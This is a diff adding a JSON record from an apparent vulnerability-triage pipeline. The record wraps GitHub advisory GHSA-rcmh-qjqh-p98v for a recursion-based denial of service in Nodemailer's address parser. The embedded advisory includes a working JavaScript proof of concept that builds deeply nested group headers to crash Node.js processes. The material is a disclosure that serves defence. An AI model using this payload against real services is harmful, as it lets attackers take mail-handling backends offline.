@@ -1,0 +1,59 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/206969057?v=4\", \"events_url\": \"https://api.github.com/users/uko3211/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/uko3211/followers\", \"following_url\": \"https://api.github.com/users/uko3211/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/uko3211/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/uko3211\", \"id\": 206969057, \"login\": \"uko3211\", \"node_id\": \"U_kgDODFYY4Q\", \"organizations_url\": \"https://api.github.com/users/uko3211/orgs\", \"received_events_url\": \"https://api.github.com/users/uko3211/received_events\", \"repos_url\": \"https://api.github.com/users/uko3211/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/uko3211/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/uko3211/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/uko3211\", \"user_view_type\": \"public\"}}, {\"type\": \"analyst\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/194674512?v=4\", \"events_url\": \"https://api.github.com/users/albertabiev1/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/albertabiev1/followers\", \"following_url\": \"https://api.github.com/users/albertabiev1/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/albertabiev1/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/albertabiev1\", \"id\": 194674512, \"login\": \"albertabiev1\", \"node_id\": \"U_kgDOC5p_UA\", \"organizations_url\": \"https://api.github.com/users/albertabiev1/orgs\", \"received_events_url\": \"https://api.github.com/users/albertabiev1/received_events\", \"repos_url\": \"https://api.github.com/users/albertabiev1/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/albertabiev1/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/albertabiev1/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/albertabiev1\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2025-14874\", \"cvss\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-703\", \"name\": \"Improper Check or Handling of Exceptional Conditions\"}], \"description\": \"### Summary\\nA DoS can occur that immediately halts the system due to the use of an unsafe function.\\n\\n### Details\\nAccording to **RFC 5322**, nested group structures (a group inside another group) are not allowed. Therefore, in lib/addressparser/index.js, the email address parser performs flattening when nested groups appear, since such input is likely to be abnormal. (If the address is valid, it is added as-is.) In other words, the parser flattens all nested groups and inserts them into the final group list.\\nHowever, the code implemented for this flattening process can be exploited by malicious input and triggers DoS\\n\\nRFC 5322 uses a colon (:) to define a group, and commas (,) are used to separate members within a group.\\nAt the following location in lib/addressparser/index.js:\\n\\nhttps://github.com/nodemailer/nodemailer/blob/master/lib/addressparser/index.js#L90\\n\\nthere is code that performs this flattening. The issue occurs when the email address parser attempts to process the following kind of malicious address header:\\n\\n```g0: g1: g2: g3: ... gN: victim@example.com;```\\n\\nBecause no recursion depth limit is enforced, the parser repeatedly invokes itself in the pattern\\n`addressparser → _handleAddress → addressparser → ...`\\nfor each nested group. As a result, when an attacker sends a header containing many colons, Nodemailer enters infinite recursion, eventually throwing Maximum call stack size exceeded and causing the process to terminate immediately. Due to the structure of this behavior, no authentication is required, and a single request is enough to shut down the service.\\n\\nThe problematic code section is as follows:\\n```js\\nif (isGroup) {\\n    ...\\n    if (data.group.length) {\\n        let parsedGroup = addressparser(data.group.join(',')); // <- boom!\\n        parsedGroup.forEach(member => {\\n            if (member.group) {\\n                groupMembers = groupMembers.concat(member.group);\\n            } else {\\n                groupMembers.push(member);\\n            }\\n        });\\n    }\\n}\\n```\\n`data.group` is expected to contain members separated by commas, but in the attacker’s payload the group contains colon `(:)` tokens. Because of this, the parser repeatedly triggers recursive calls for each colon, proportional to their number.\\n\\n### PoC\\n\\n```\\nconst nodemailer = require('nodemailer');\\n\\nfunction buildDeepGroup(depth) {\\n  let parts = [];\\n  for (let i = 0; i < depth; i++) {\\n    parts.push(`g${i}:`);\\n  }\\n  return parts.join(' ') + ' user@example.com;';\\n}\\n\\nconst DEPTH = 3000; // <- control depth \\nconst toHeader = buildDeepGroup(DEPTH);\\nconsole.log('to header length:', toHeader.length);\\n\\nconst transporter = nodemailer.createTransport({\\n  streamTransport: true,\\n  buffer: true,\\n  newline: 'unix'\\n});\\n\\nconsole.log('parsing start');\\n\\ntransporter.sendMail(\\n  {\\n    from: 'test@example.com',\\n    to: toHeader,\\n    subject: 'test',\\n    text: 'test'\\n  },\\n  (err, info) => {\\n    if (err) {\\n      console.error('error:', err);\\n    } else {\\n      console.log('finished :', info && info.envelope);\\n    }\\n  }\\n);\\n```\\nAs a result, when the colon is repeated beyond a certain threshold, the Node.js process terminates immediately.\\n\\n### Impact\\nThe attacker can achieve the following:\\n\\n1. Force an immediate crash of any server/service that uses Nodemailer\\n2. Kill the backend process with a single web request\\n3. In environments using PM2/Forever, trigger a continuous restart loop, causing severe resource exhaustion”\", \"epss\": {\"percentage\": 0.00416, \"percentile\": 0.33768}, \"ghsa_id\": \"GHSA-rcmh-qjqh-p98v\", \"github_reviewed_at\": \"2025-12-01T20:44:25Z\", \"html_url\": \"https://github.com/advisories/GHSA-rcmh-qjqh-p98v\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-rcmh-qjqh-p98v\"}, {\"type\": \"CVE\", \"value\": \"CVE-2025-14874\"}], \"nvd_published_at\": null, \"published_at\": \"2025-12-01T20:44:25Z\", \"references\": [\"https://github.com/nodemailer/nodemailer/security/advisories/GHSA-rcmh-qjqh-p98v\", \"https://github.com/nodemailer/nodemailer/commit/b61b9c0cfd682b6f647754ca338373b68336a150\", \"https://nvd.nist.gov/vuln/detail/CVE-2025-14874\", \"https://access.redhat.com/security/cve/CVE-2025-14874\", \"https://bugzilla.redhat.com/show_bug.cgi?id=2418133\", \"https://github.com/nodemailer/nodemailer/commit/6218b8df\", \"https://github.com/advisories/GHSA-rcmh-qjqh-p98v\"], \"repository_advisory_url\": \"https://api.github.com/repos/nodemailer/nodemailer/security-advisories/GHSA-rcmh-qjqh-p98v\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/nodemailer/nodemailer\", \"summary\": \"Nodemailer’s addressparser is vulnerable to DoS caused by recursive calls\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-15T21:55:34Z\", \"url\": \"https://api.github.com/advisories/GHSA-rcmh-qjqh-p98v\", \"vulnerabilities\": [{\"first_patched_version\": \"7.0.11\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"nodemailer\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 3.0.0, <= 7.0.10\"}, {\"first_patched_version\": null, \"package\": {\"ecosystem\": \"maven\", \"name\": \"org.webjars.npm:nodemailer\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 3.0.0, <= 6.10.1\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-rcmh-qjqh-p98v",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "nodemailer: >= 3.0.0, <= 7.0.10",
+      "org.webjars.npm:nodemailer: >= 3.0.0, <= 6.10.1"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2025-14874"
+    ],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "nodemailer",
+      "org.webjars.npm:nodemailer"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:51:54.924124Z",
+  "provenance": {
+    "content_sha256": "c016d36e41233e46fe97e1dcc85104c319209091c962829c4b41875e3067266e",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2025-12-01T20:44:25Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-rcmh-qjqh-p98v",
+  "status": "active",
+  "title": "Nodemailer’s addressparser is vulnerable to DoS caused by recursive calls",
+  "updated_at": "2026-07-15T21:55:34Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-rcmh-qjqh-p98v"
+}
